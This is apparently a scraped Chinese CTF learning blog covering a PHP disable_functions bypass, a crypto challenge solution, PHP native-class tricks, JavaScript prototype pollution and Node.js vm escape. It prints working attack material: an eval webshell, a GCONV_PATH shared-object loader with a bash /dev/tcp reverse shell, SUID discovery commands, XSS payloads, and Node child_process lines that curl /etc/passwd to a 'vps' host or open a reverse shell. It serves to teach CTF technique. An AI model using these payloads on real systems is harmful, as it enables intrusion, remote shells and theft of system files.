第一次见这么多的disable_functions 但是show_source，file_get_contents没被ban，可以用这个读取源码 &lt;?php (&#39;sho&#39;.&#39;w_source&#39;)(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&quot;);&#x2F;&#x2F;这里拼接绕过是因为这个函数是被放了黑名单里了 ?&gt; index.php HTTP&#x2F;1.1 200 OK Server: openresty Date: Sat, 26 Mar 2022 09:01:18 GMT Content-Type: text&#x2F;html; charset&#x3D;UTF-8 Content-Length: 1695 Connection: close Vary: Accept-Encoding &lt;div class&#x3D;&quot;light&quot;&gt;&lt;span class&#x3D;&quot;glow&quot;&gt; &lt;form enctype&#x3D;&quot;multipart&#x2F;form-data&quot; method&#x3D;&quot;post&quot; onsubmit&#x3D;&quot;return checkFile()&quot;&gt; 嘿伙计，传个火？！ &lt;input class&#x3D;&quot;input_file&quot; type&#x3D;&quot;file&quot; name&#x3D;&quot;upload_file&quot;&#x2F;&gt; &lt;input class&#x3D;&quot;button&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;upload&quot;&#x2F;&gt; &lt;&#x2F;form&gt; &lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;flare&quot;&gt;&lt;&#x2F;span&gt;&lt;div&gt; &lt;?php function fun($var): bool&#123; $blacklist &#x3D; [&quot;\\$_&quot;, &quot;eval&quot;,&quot;copy&quot; ,&quot;assert&quot;,&quot;usort&quot;,&quot;include&quot;, &quot;require&quot;, &quot;$&quot;, &quot;^&quot;, &quot;~&quot;, &quot;-&quot;, &quot;%&quot;, &quot;*&quot;,&quot;file&quot;,&quot;fopen&quot;,&quot;fwriter&quot;,&quot;fput&quot;,&quot;copy&quot;,&quot;curl&quot;,&quot;fread&quot;,&quot;fget&quot;,&quot;function_exists&quot;,&quot;dl&quot;,&quot;putenv&quot;,&quot;system&quot;,&quot;exec&quot;,&quot;shell_exec&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;proc_close&quot;, &quot;proc_get_status&quot;,&quot;checkdnsrr&quot;,&quot;getmxrr&quot;,&quot;getservbyname&quot;,&quot;getservbyport&quot;, &quot;syslog&quot;,&quot;popen&quot;,&quot;show_source&quot;,&quot;highlight_file&quot;,&quot;&#96;&quot;,&quot;chmod&quot;]; foreach($blacklist as $blackword)&#123; if(strstr($var, $blackword)) return True;&#x2F;&#x2F;strstr大小写敏感，所以可以用大写绕过这个黑名单 &#125; return False; &#125; error_reporting(0); &#x2F;&#x2F;设置上传目录 define(&quot;UPLOAD_PATH&quot;, &quot;.&#x2F;uploads&quot;); $msg &#x3D; &quot;Upload Success!&quot;; if (isset($_POST[&#39;submit&#39;])) &#123; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $ext &#x3D; pathinfo($file_name,PATHINFO_EXTENSION); if(!preg_match(&quot;&#x2F;php&#x2F;i&quot;, strtolower($ext)))&#123; die(&quot;只要好看的php&quot;); &#125; $content &#x3D; file_get_contents($temp_file); if(fun($content))&#123; die(&quot;诶，被我发现了吧&quot;); &#125; $new_file_name &#x3D; md5($file_name).&quot;.&quot;.$ext; $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $new_file_name; if (move_uploaded_file($temp_file, $img_path))&#123; $is_upload &#x3D; true; &#125; else &#123; $msg &#x3D; &#39;Upload Failed!&#39;; die(); &#125; echo &#39;&lt;div style&#x3D;&quot;color:#F00&quot;&gt;&#39;.$msg.&quot; Look here~ &quot;.$img_path.&quot;&lt;&#x2F;div&gt;&quot;; &#125; 既然要绕过disable_functions,我们就要想到利用so文件 使用GCONV_PATH与iconv进行bypass disable_functions_lesion__的博客-CSDN博客 但是在so文件中有些符号会被这个文件上传页面的黑名单过滤 所以这里我们要采用自己写一个文件上传的无黑名单的页面来绕过 1.php PGRpdiBjbGFzcz0ibGlnaHQiPjxzcGFuIGNsYXNzPSJnbG93Ij4KPGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJwb3N0IiBvbnN1Ym1pdD0icmV0dXJuIGNoZWNrRmlsZSgpIj4KICAgIOWYv+S8meiuoe+8jOS8oOS4queBq++8n++8gQogICAgPGlucHV0IGNsYXNzPSJpbnB1dF9maWxlIiB0eXBlPSJmaWxlIiBuYW1lPSJ1cGxvYWRfZmlsZSIvPgogICAgPGlucHV0IGNsYXNzPSJidXR0b24iIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0idXBsb2FkIi8+CjwvZm9ybT4KPC9zcGFuPjxzcGFuIGNsYXNzPSJmbGFyZSI+PC9zcGFuPjxkaXY+Cjw&#x2F;cGhwCmVycm9yX3JlcG9ydGluZygwKTsKLy&#x2F;orr7nva7kuIrkvKDnm67lvZUKZGVmaW5lKCJVUExPQURfUEFUSCIsICIvdG1wIik7CiRtc2cgPSAiVXBsb2FkIFN1Y2Nlc3MhIjsKaWYgKGlzc2V0KCRfUE9TVFsnc3VibWl0J10pKSB7CiR0ZW1wX2ZpbGUgPSAkX0ZJTEVTWyd1cGxvYWRfZmlsZSddWyd0bXBfbmFtZSddOwokZmlsZV9uYW1lID0gJF9GSUxFU1sndXBsb2FkX2ZpbGUnXVsnbmFtZSddOwokZXh0ID0gcGF0aGluZm8oJGZpbGVfbmFtZSxQQVRISU5GT19FWFRFTlNJT04pOwovL3h4eHh4CiRjb250ZW50ID0gZmlsZV9nZXRfY29udGVudHMoJHRlbXBfZmlsZSk7CgokbmV3X2ZpbGVfbmFtZSA9ICRmaWxlX25hbWU7CiAgICAgICAgJGltZ19wYXRoID0gVVBMT0FEX1BBVEggLiAnLycgLiAkbmV3X2ZpbGVfbmFtZTsKICAgICAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCR0ZW1wX2ZpbGUsICRpbWdfcGF0aCkpewogICAgICAgICAgICAkaXNfdXBsb2FkID0gdHJ1ZTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkbXNnID0gJ1VwbG9hZCBGYWlsZWQhJzsKICAgICAgICAgICAgZGllKCk7CiAgICAgICAgfQogICAgICAgIGVjaG8gJzxkaXYgc3R5bGU9ImNvbG9yOiNGMDAiPicuJG1zZy4iIExvb2sgaGVyZX4gIi4kaW1nX3BhdGguIjwvZGl2PiI7Cn0K base64解码后实际的内容 &lt;div class&#x3D;&quot;light&quot;&gt;&lt;span class&#x3D;&quot;glow&quot;&gt; &lt;form enctype&#x3D;&quot;multipart&#x2F;form-data&quot; method&#x3D;&quot;post&quot; onsubmit&#x3D;&quot;return checkFile()&quot;&gt; 嘿伙计，传个火？！ &lt;input class&#x3D;&quot;input_file&quot; type&#x3D;&quot;file&quot; name&#x3D;&quot;upload_file&quot;&#x2F;&gt; &lt;input class&#x3D;&quot;button&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;upload&quot;&#x2F;&gt; &lt;&#x2F;form&gt; &lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;flare&quot;&gt;&lt;&#x2F;span&gt;&lt;div&gt; &lt;?php error_reporting(0); &#x2F;&#x2F;设置上传目录 define(&quot;UPLOAD_PATH&quot;, &quot;&#x2F;tmp&quot;); $msg &#x3D; &quot;Upload Success!&quot;; if (isset($_POST[&#39;submit&#39;])) &#123; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $ext &#x3D; pathinfo($file_name,PATHINFO_EXTENSION); &#x2F;&#x2F;xxxxx $content &#x3D; file_get_contents($temp_file); $new_file_name &#x3D; $file_name; $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $new_file_name; if (move_uploaded_file($temp_file, $img_path))&#123; $is_upload &#x3D; true; &#125; else &#123; $msg &#x3D; &#39;Upload Failed!&#39;; die(); &#125; echo &#39;&lt;div style&#x3D;&quot;color:#F00&quot;&gt;&#39;.$msg.&quot; Look here~ &quot;.$img_path.&quot;&lt;&#x2F;div&gt;&quot;; &#125; 同时我们还要串一个一句话木马来包含这个文件，使这段base64加密的东西可以被解析 &lt;?php Eval(base64_decode(&#39;ZXZhbCgkX1BPU1RbJ2EnXSk&#x3D;&#39;).&#39;;&#39;);&#x2F;&#x2F;注意eval里的分号是要拼接上去，而不是直接加上 ?&gt; //实际上这里做题的时候经常报错，但是用get方法取值就没问题,所以我下面都用的get的一句话木马 再利用include和php://filter来让之前我们写的页面的代码执行 a&#x3D;include(base64_decode(&#39;cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT05YmMwOWVlNGUwZWI5MTg0MGY3YzUyMDdlMWQ4NDg1Mi5waHA&#x3D;&#39;)); 里面这段base64加密的内容是 php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;9bc09ee4e0eb91840f7c5207e1d84852.php 现在我们就可以根据使用GCONV_PATH与iconv进行bypass disable_functions_lesion__的博客-CSDN博客 这篇文章里的东西进行提交了 首先是gconv-modules文件 module 自定义字符集名字（大写）&#x2F;&#x2F; INTERNAL ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;自定义字符集名字（小写） 2 module INTERNAL 自定义字符集名字（大写）&#x2F;&#x2F; ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;自定义字符集名字（小写） 2 根据题目我们可以改成aa module A&#x2F;&#x2F; INTERNAL ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;a 2 module INTERNAL A&#x2F;&#x2F; ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;a 2 然后是so文件 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; void gconv() &#123;&#125; void gconv_init() &#123; system(&quot;希望执行的命令&quot;); &#125; 我们可以写成 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; void gconv() &#123;&#125; void gconv_init() &#123; system(&quot;bash -c &#39;exec bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&#39;&quot;); &#125; 然后编译 gcc 源代码文件名.c -o 自定义字符集名.so -shared -fPIC 上传 然后书写shell.php &lt;?php putenv(&quot;GCONV_PATH&#x3D;&#x2F;tmp&#x2F;&quot;); iconv(&quot;自定义字符集名&quot;, &quot;UTF-8&quot;, &quot;whatever&quot;); ?&gt; 我们就直接传参 a&#x3D;putenv(&quot;GCONV_PATH&#x3D;&#x2F;tmp&#x2F;&quot;);include(&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.a.utf-8&#x2F;resource&#x3D;&#x2F;tmp&#x2F;a.so&#39;); shell弹出来了 但是要访问flag文件权限不够 suid提权Linux提权-suid提权 - 走看看 (zoukankan.com) find / -user root -perm -4000 -print 2&gt;/dev/null 这步不知道为什么我没有复现成功，只输出了三个值就卡住了 但是可以用别的命令看看 find &#x2F;bin -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null find &#x2F;usr -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null 最后就是看到nl有权限，用nl读取flag就行 MISC月圆之夜 我破译了神级彩蛋！这款游戏竟然藏了这么多剧情？《月圆之夜》究竟讲了什么故事？_单机游戏热门视频 (bilibili.com) B站有解密的，对着找就行 CRYPTOFlowerCipher# python3 from secret import flag import random # flag &#x3D; b&#39;flag&#123;%s&#125;&#39; % md5(something).hexdigest() # note that md5 only have characters &#39;abcdef&#39; and digits def Flower(x, key): flower &#x3D; random.randint(0, 4096) return x * (key ** 3 + flower) flag &#x3D; flag[5:-1] rounds &#x3D; len(flag) L, R &#x3D; 1, 0 for i in range(rounds): L, R &#x3D; R + Flower(L, flag[i]), L print(L, R) &#39;&#39;&#39; 15720197268945348388429429351303006925387388927292304717594511259390194100850889852747653387197205392431053069043632340374252629529419776874410817927770922310808632581666181899 139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003 &#39;&#39;&#39; 加密方式就是把flag的字符转成md5然后再转成ascii码后套在Flower函数里计算，然后对RL重新赋值，这样的R其实就 是前一个L的值，而实际上L = 上一个R + 上一个L乘上(key ** 3 + flower)， 显然 L1 * (key ** 3 + flower)是能被L1整除的，而R1不行 所以L2/L1的余数就是L2 这样我们可以得到所有的L和R R &#x3D; &#123;0: 139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003, 1: 935298420671754230833014738849730432588169238033228173469583131476419084794695511761146278309606770027490667271610796624269392034586175088396235641537756093736185366, 2: 7402968320895532116930768370098929764678065093602516751185225609968053961398195671796668035067389408306736179462173593882795916384659802649189800851665219198361, 3: 41491807647864532203061547188977816042392604608090542687445179257686072390683442091157724792609311622180322599523073162631870961894947012137520634996058265, 4: 363542281260527120641507826394376579427002124891256726811704925452455933892306777570036028677323021255266880206017499363363356743613369155668503557061, 5: 3038050870004975946934828279229998090001629942971672705946371743686684953534372767609080560274203027849883925292484330032865963662762987021572213, 6: 3121683903445470016877317983137081025437455800044243487676152297523129079630621593231064333666220053742946978640516933836161839706107832842, 7: 16713517279670522179142602316669021266414545548551242366498025076135157482269671171234675566764239156725485371108735804221489129242235, 8: 17728566345779292838907909381612640668036643431117165902908905722221490552536570008262521006387722966311695266888986102760148482, 9: 18822751726365286700612339826340137082689797360168751039458371318582478795225200597245268849966216725478600774872948579145, 10: 19346619488865481717482094100686681292384530125288986759529832156605546935716879938892385301891033660176897469426477, 11: 19304497076225869711849746340455541612339463403087957113496859433662333338211557279788474751973335123601723351, 12: 19287157921091613716265688246942013055491723611322575658962386161345041119412098008892719335475158074595, 13: 163194634853135239779527687110852732238802459017066087158243026833107794785760861815584881897662446, 14: 973825402922208545745882895848854992390620148165434035074196392656950555217820068399921894085, 15: 6028609474886885541605763758989943967354486126474121155263363791803356933057570965004061, 16: 5830376668137452804173383567980586211563348379884185911787096393298400138955904511, 17: 32759342090485149698017824597983901673872922475506121132811189377165700630061, 18: 241267801518963217329803327254141129383508497053892152707957403620167975, 19: 240324048977128823416619126180138745528644638124733113619292984561, 20: 1501209023627137765492979001172871435243212151481455508796928, 21: 11731219952144596819377276074864534430521345582519171825, 22: 11050144307727113700681557772687121323224647867153, 23: 10722465754210488857842384539746544074196670, 24: 67952303343509961405922862120527631953, 25: 424678007756192434300006917804988, 26: 449366186013055209469307061, 27: 2694478038943586736328, 28: 24316418691677517, 29: 137492755075, 30: 133317, 31: 1, 32: 0&#125; L &#x3D; &#123;0: 15720197268945348388429429351303006925387388927292304717594511259390194100850889852747653387197205392431053069043632340374252629529419776874410817927770922310808632581666181899, 1: 139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003, 2: 935298420671754230833014738849730432588169238033228173469583131476419084794695511761146278309606770027490667271610796624269392034586175088396235641537756093736185366, 3: 7402968320895532116930768370098929764678065093602516751185225609968053961398195671796668035067389408306736179462173593882795916384659802649189800851665219198361, 4: 41491807647864532203061547188977816042392604608090542687445179257686072390683442091157724792609311622180322599523073162631870961894947012137520634996058265, 5: 363542281260527120641507826394376579427002124891256726811704925452455933892306777570036028677323021255266880206017499363363356743613369155668503557061, 6: 3038050870004975946934828279229998090001629942971672705946371743686684953534372767609080560274203027849883925292484330032865963662762987021572213, 7: 3121683903445470016877317983137081025437455800044243487676152297523129079630621593231064333666220053742946978640516933836161839706107832842, 8: 16713517279670522179142602316669021266414545548551242366498025076135157482269671171234675566764239156725485371108735804221489129242235, 9: 17728566345779292838907909381612640668036643431117165902908905722221490552536570008262521006387722966311695266888986102760148482, 10: 18822751726365286700612339826340137082689797360168751039458371318582478795225200597245268849966216725478600774872948579145, 11: 19346619488865481717482094100686681292384530125288986759529832156605546935716879938892385301891033660176897469426477, 12: 19304497076225869711849746340455541612339463403087957113496859433662333338211557279788474751973335123601723351, 13: 19287157921091613716265688246942013055491723611322575658962386161345041119412098008892719335475158074595, 14: 163194634853135239779527687110852732238802459017066087158243026833107794785760861815584881897662446, 15: 973825402922208545745882895848854992390620148165434035074196392656950555217820068399921894085, 16: 6028609474886885541605763758989943967354486126474121155263363791803356933057570965004061, 17: 5830376668137452804173383567980586211563348379884185911787096393298400138955904511, 18: 32759342090485149698017824597983901673872922475506121132811189377165700630061, 19: 241267801518963217329803327254141129383508497053892152707957403620167975, 20: 240324048977128823416619126180138745528644638124733113619292984561, 21: 1501209023627137765492979001172871435243212151481455508796928, 22: 11731219952144596819377276074864534430521345582519171825, 23: 11050144307727113700681557772687121323224647867153, 24: 10722465754210488857842384539746544074196670, 25: 67952303343509961405922862120527631953, 26: 424678007756192434300006917804988, 27: 449366186013055209469307061, 28: 2694478038943586736328, 29: 24316418691677517, 30: 137492755075, 31: 133317, 32: 1&#125; 然后再用(L[i]-R[i+1])//L[i+1]求出flag[i]**3 + flower的值 FLAG &#x3D; &#123;0: 112511, 1: 149387, 2: 126341, 3: 178420, 4: 114132, 5: 119663, 6: 973209, 7: 186776, 8: 942745, 9: 941869, 10: 972922, 11: 1002182, 12: 1000899, 13: 118185, 14: 167581, 15: 161534, 16: 1034000, 17: 177976, 18: 135780, 19: 1003927, 20: 160087, 21: 127967, 22: 1061635, 23: 1030560, 24: 157794, 25: 160009, 26: 945060, 27: 166773, 28: 110809, 29: 176856, 30: 1031322, 31: 133317&#125; 由于1的ascii的三次方和2的ascii码之间的差值也要比最大的flower大，所以我们就可以遍历一下 得到flag值 FLAG &#x3D; &#123;0: 112511, 1: 149387, 2: 126341, 3: 178420, 4: 114132, 5: 119663, 6: 973209, 7: 186776, 8: 942745, 9: 941869, 10: 972922, 11: 1002182, 12: 1000899, 13: 118185, 14: 167581, 15: 161534, 16: 1034000, 17: 177976, 18: 135780, 19: 1003927, 20: 160087, 21: 127967, 22: 1061635, 23: 1030560, 24: 157794, 25: 160009, 26: 945060, 27: 166773, 28: 110809, 29: 176856, 30: 1031322, 31: 133317&#125; flag &#x3D; &#39;&#39; for i in range(32): #FLAG[i] &#x3D; (L[i]-R[i+1])&#x2F;&#x2F;L[i+1] for j in range(48,123): if j**3 &lt;&#x3D; FLAG[i] and (j+1)**3 &gt; FLAG[i]: flag +&#x3D; chr(j) else: continue print(&#39;flag&#x3D;&#39;+flag[::-1]) &#x2F;&#x2F;3e807b66ef26d38e671ddcbb9c108250","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"从一道ctf题看php原生类","slug":"从一道ctf题看php原生类","date":"2022-02-25T13:06:44.000Z","updated":"2022-04-25T12:57:03.775Z","comments":true,"path":"2022/02/25/从一道ctf题看php原生类/","link":"","permalink":"https://ethe448.github.io/2022/02/25/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E7%9C%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/","excerpt":"","text":"这是ctfshow的一道比赛题 先来看看源码 &lt;?php error_reporting(0); if(isset($_GET[&#39;source&#39;]))&#123; highlight_file(__FILE__); echo &quot;\\$flag_filename &#x3D; &#39;flag&#39;.md5(???).&#39;php&#39;;&quot;; die(); &#125; if(isset($_POST[&#39;a&#39;]) &amp;&amp; isset($_POST[&#39;b&#39;]) &amp;&amp; isset($_POST[&#39;c&#39;]))&#123; $c &#x3D; $_POST[&#39;c&#39;]; $count[++$c] &#x3D; 1; if($count[] &#x3D; 1) &#123; $count[++$c] &#x3D; 1; print_r($count); die(); &#125;else&#123; $a &#x3D; $_POST[&#39;a&#39;]; $b &#x3D; $_POST[&#39;b&#39;]; echo new $a($b); &#125; &#125; ?&gt; $flag_filename &#x3D; &#39;flag&#39;.md5(???).&#39;php&#39;; 绕过第二个if判断是利用了数组溢出的原理 然后进入else语句 一般看到echo new $a($b)这种形式，就需要考虑利用php的原生类来遍历目录以及读取文件 报错类Error在PHP7版本中，因为Error中带有__toString方法，该方法会将传入给__toString的参数原封不动的输出到浏览器。在这么一个过程中可能会产生XSS。 a&#x3D;Error&amp;b&#x3D;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&amp;c&#x3D;9223372036854775806 Exception与Error类似，Exception同样有__toString方法，因此测试代码和上方一样，传入以下payload，同样可以XSS。 a&#x3D;Exception&amp;b&#x3D;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&amp;c&#x3D;9223372036854775806 遍历目录类DirectoryIteratorDirectoryIterator类的__construct方法会构造一个迭代器，如果使用echo输出该迭代器，将会返回迭代器的第一项 返回了一个点，这个点代表这当前目录 如果要匹配其他文件，要利用glob协议 glob协议支持通配符，所以对于不知道文件名的文件可以利用通配符进行匹配 FilesystemIterator与DirectoryIterator类似，但实际使用时发现有些不同 GlobIterator无需加glob协议，因为这是自带的 读取文件类SplFileObject SplFileObject类为文件提供了一个面向对象接口 也就是说我们可以利用这个来读取文件，例如 a&#x3D;SplFileObject&amp;b&#x3D;flag.php 但是由于这个类返回的是迭代器，所以不能完整的读出文件，所以就要利用php://filter来将文件内容以全部输出 回到这道题我们可以利用 FilesystemIterator、DirectoryIterator或GlobIterator找到flag所在的目录，再用SplFileObject读出文件内容 但是这道题中flag文件并不叫flag.php而是flag.md5(???).php，所以我们要用通配符找到真正的flag文件， 在通配符中，？代表一个字符，但是必须存在，而*表示存在任意个字符，但是也包括零个，所以因为迭代器的性质，只加*就只能匹配到flag.php 但是如果我们用FilesystemIterator，我们可以直接加路径看到这个flag文件，不太理解为什么 接下来就是用SplFileObject读出来就然后base64解个码就行 原生类获取注释看见这个想起了去年国赛我唯一出了的一道题 &lt;?php highlight_file(__file__); class User &#123; private static $c &#x3D; 0; function a() &#123; return ++self::$c; &#125; function b() &#123; return ++self::$c; &#125; function c() &#123; return ++self::$c; &#125; function d() &#123; return ++self::$c; &#125; &#x2F;** * flag *&#x2F; function e() &#123; return ++self::$c; &#125; function f() &#123; return ++self::$c; &#125; function g() &#123; return ++self::$c; &#125; function h() &#123; return ++self::$c; &#125; function i() &#123; return ++self::$c; &#125; function j() &#123; return ++self::$c; &#125; function k() &#123; return ++self::$c; &#125; function l() &#123; return ++self::$c; &#125; function m() &#123; return ++self::$c; &#125; function n() &#123; return ++self::$c; &#125; function o() &#123; return ++self::$c; &#125; function p() &#123; return ++self::$c; &#125; function q() &#123; return ++self::$c; &#125; function r() &#123; return ++self::$c; &#125; function s() &#123; return ++self::$c; &#125; function t() &#123; return ++self::$c; &#125; &#125; $rc&#x3D;$_GET[&quot;rc&quot;]; $rb&#x3D;$_GET[&quot;rb&quot;]; $ra&#x3D;$_GET[&quot;ra&quot;]; $rd&#x3D;$_GET[&quot;rd&quot;]; $method&#x3D; new $rc($ra, $rb); var_dump($method-&gt;$rd()); flag在注释里但并不会被显示出来，但是我们可以利用通过反射 ReflectionMethod 类来获取类方法的相关信息 ?rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;e&amp;rd&#x3D;getDocComment","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"}]},{"title":"js漏洞","slug":"js漏洞","date":"2022-02-21T07:09:54.000Z","updated":"2022-04-25T12:57:12.010Z","comments":true,"path":"2022/02/21/js漏洞/","link":"","permalink":"https://ethe448.github.io/2022/02/21/js%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"原型链污染深入了解JavaScript在JavaScript中，一切皆对象 当我们创建一个js对象如 var a &#x3D; &#123;&#125;; 它会拥有一些自带的属性，如 JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义： 这里test()函数的内容其实就是test类的构造函数 而constructor这个属性就是用于查看对象的构造函数 接下来我们要知道prototype和**_proto_**又是什么 从类的角度讲，prototype是其一个属性，所有类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。但是类所实例化的对象并不能通过prototype访问原型，所以才有__proto__出现，且一个对象的proto属性，指向这个对象所在的类的prototype属性。 这个特性被用于实现JavaScript中的继承机制，为什么我们定义的a有 toString() 属性？这正是继承机制的作用。 对于a而言有个__proto__属性指向window.Object.prototype 这样你在调用a.toString() 的时候，a本身没有 toString，就去 a._proro_ 上面去找 toString。 所以你调用 a.toString 的时候，实际上调用的是 window.Object.prototype.toString 对于p神的例子我的理解是对Foo类的父类添加一个show函数，同样是利用继承来实现存在foo.show() 总结一下 prototype是一个类的属性，所有类对象在实例化的时候将会拥有prototype中的属性和方法 一个对象的__proto__属性，指向这个对象所在的类的prototype属性 类在运行程序运行时是可以修改的 JavaScript的原型与原型链这种继承机制使得JavaScript中有原型和原型链的存在 原型 ①所有引用类型都有一个__proto__(隐式原型)属性，属性值是一个普通的对象②所有函数都有一个prototype(原型)属性，属性值是一个普通的对象③所有引用类型的__proto__属性指向它构造函数的prototype** 原型链 当访问一个对象的某个属性时，会先在这个对象本身属性上查找，如果没有找到，则会去它的__proto__隐式原型上查找，即它的构造函数的prototype，如果还没有找到就会再在构造函数的prototype的__proto__中查找，这样一层一层向上查找就会形成一个链式结构，我们称为原型链。 举例： 若有代码 function Parent(month)&#123; this.month &#x3D; month; &#125; var child &#x3D; new Parent(&#39;Ann&#39;); console.log(child.month); &#x2F;&#x2F; Ann console.log(child.father); &#x2F;&#x2F; undefined 则在child中查找某个属性时会 什么是原型链污染Object.prototype是一个对象，用于表示Object的原型对象。几乎所有的JavaScript对象都是Object的实例，其原型链上最后一个就是指向Object.prototype。 所以我们可以通过修改Object.prototype来实现对变量的修改 可以看到我们将a._proto_.bar 设置为2 新定义的变量也有了bar属性，且为2 那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。 原型链污染的利用当存在控制数组（对象）的“键名”的操作时，我们就可以设置__proto__的值，从而实现原型链污染 最显然的情况obj[a][b] &#x3D; value obj[a][b][c] &#x3D; value 如果控制了a,b,c及value就可以进行原型链污染的攻击, 可以控制a=__proto__ 利用特殊的api 对象merge 对象clone（其实内核就是将待操作的对象merge到一个空对象中） 例如 function merge(target, source) &#123; for (let key in source) &#123; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] &#x3D; source[key] &#125; &#125; &#125; 这时如果key是__proto__不就可以直接修改其原型了吗 但是这里并没有成功，这是因为，我们用JavaScript创建o2的过程（let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;）中，__proto__已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是[a, b]，__proto__并不是一个key，自然也不会修改Object的原型。 只有经过JSON.parse解析,才能让__proto__代表了一个key 成功污染 参考文章： 深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com) 【原型和原型链】什么是原型和原型链_沉迷学习 日渐消瘦-CSDN博客_原型链 原型链污染漏洞(一)_lonmar的博客-CSDN博客 从杭电hgame-week4学原型链污染 - 简书 (jianshu.com) 三张图搞懂JavaScript的原型对象与原型链 - 水乙 - 博客园 (cnblogs.com) JavaScript Prototype污染攻击（CTF 例题分析）_a3320315的博客-CSDN博客 node.js 沙盒逃逸背景在nodejs当中了，eval始终存在着一定的问题，能够出乎意料的执行系统命令。 对于存在利用可能性的eval函数，可以使用chile_process.exec来间接调用&#x2F;bash.sh。 它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造require(&#39;child_process&#39;).exec(&#39;&#39;);来进行调用。 like： 读取文件： require(&#39;child_process&#39;).exec(&#39;curl -F &quot;x&#x3D;&#96;cat &#x2F;etc&#x2F;passwd&#96;&quot; http:&#x2F;&#x2F;vps&#39;);; 反弹shell： q&#x3D;require(&#39;child_process&#39;).exec(&#39;echo YmFzaCAtaSAmZ3Q7JiAvZGV2L3RjcC8xOTIuMTY4LjExNC4xLzQ0NDQgMCZndDsmMQ&#x3D;&#x3D;|base64 -d|bash&#39;); 即bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.114.1&#x2F;4444 0&gt;&amp;1 类eval函数： setInteval(some_function, 2000) setTimeout(some_function, 2000); 相当于匿名函数，即php当中create_function。 eval/Function 算是动态执行 JS，但无法屏蔽当前执行环境的上下文，但 node.js 里提供了 vm 模块，相当于一个虚拟机，可以让你在执行代码时候隔离当前的执行环境，避免被恶意代码攻击。 在这段代码中，我们明明定义了y=2但仍然显示y不存在，这正是vm的作用 vm.runInContext()方法用于编译代码。它在contextifiedObject的上下文中运行代码，然后返回输出。此外，正在运行的代码无法访问本地范围，并且以前使用vm.createContext()方法将contextifiedObject对象上下文化。 也就是说我们将code这段要编译和运行的代码限制在了context域中，无法访问到超出上下文外的任何信息 这看起来是十分安全的方式 但在官网中有这样一段话vm 模块不是安全的机制。 不要使用它来运行不受信任的代码。 也就是说，vm模块同样有被逃逸的风险 VM逃逸const vm &#x3D; require(&quot;vm&quot;); const ctx &#x3D; &#123;&#125;; vm.runInNewContext(&#39;this.constructor.constructor(&quot;return process&quot;)().exit()&#39;,ctx); console.log(&quot;Never gets executed.&quot;); 这段代码就是利用了原型链进行vm逃逸导致了程序的提前退出 创建vm环境时，首先要初始化一个对象 ctx，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。然后利用constructor来得到Function 